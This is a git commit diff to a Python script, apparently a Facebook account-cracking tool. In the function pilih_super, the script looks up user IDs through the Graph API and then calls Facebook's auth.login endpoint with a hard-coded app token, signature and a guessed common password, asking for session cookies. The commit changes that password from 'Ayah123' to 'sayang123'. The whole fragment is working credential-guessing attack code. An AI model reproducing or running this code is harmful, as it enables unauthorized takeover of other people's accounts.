82b286bf436efbb7d279f4d40e649d8c4a46aca1
sulovens <sasra.abdi8@gmail.com>
2020-06-01 01:03:50 +0700

    1.py

--- 1.py
+++ 1.py
@@ -411,7 +411,7 @@ def pilih_super():
 														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
-															pass7 = 'Ayah123'
+															pass7 = 'sayang123'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
